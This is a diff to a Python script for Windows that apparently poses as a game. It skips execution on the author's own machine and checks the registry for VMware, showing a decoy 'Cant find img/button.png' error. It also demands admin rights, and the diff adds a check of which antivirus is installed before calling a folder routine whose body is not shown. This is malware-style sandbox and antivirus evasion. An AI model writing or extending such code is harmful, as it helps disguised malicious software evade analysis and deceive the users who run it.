@@ -4,15 +4,16 @@ import subprocess
 import ctypes
 from tkinter import messagebox
 
+from pcinfo import isAdmin, get_antivirus
+
 def start():
 
 	if os.name != 'nt':
 		messagebox.showerror("Error", "Your os is not windows.")
-		os._exit(0)
+		return "not windows!!!"
 
 	if platform.node() == "DESKTOP-5JN6OBN":
 		return "This is creator"
-		#pass
 
 	try:
 		key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum\IDE', 0, winreg.KEY_READ)
@@ -20,19 +21,18 @@ def start():
 		for i in range(subkey_count):
 			subkey = winreg.EnumKey(key, i)
 			if subkey.startswith('VMWARE'):
-				messagebox.showerror("Error", "Cant find img/button.png. Try reinstalling game (or this error can be caused because of virtual machine).")
+				messagebox.showerror("Error", "Cant find img/button.png")
 		winreg.CloseKey(key)
 	except:
 		pass
 
-	try:
-		is_admin = (os.getuid() == 0)
-	except AttributeError:
-		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 
-	if not is_admin:
-		messagebox.showerror("Error", "Launch script as admin.")
+	if not isAdmin():
+		messagebox.showerror("Error", "Launch this as admin.")
 		return "script dont have admin rights"
+
+	if get_antivirus() != 'Windows Defender':
+		return "Fucking antivirus"
 
 	addCurrentFolder()
 	return "all is fine"
@@ -50,6 +50,7 @@ def addCurrentFolder():
 		return "shit happened"
 
 def addGoodFolder():
+	#Todo: find good folders
 	pass
 
 print(start())
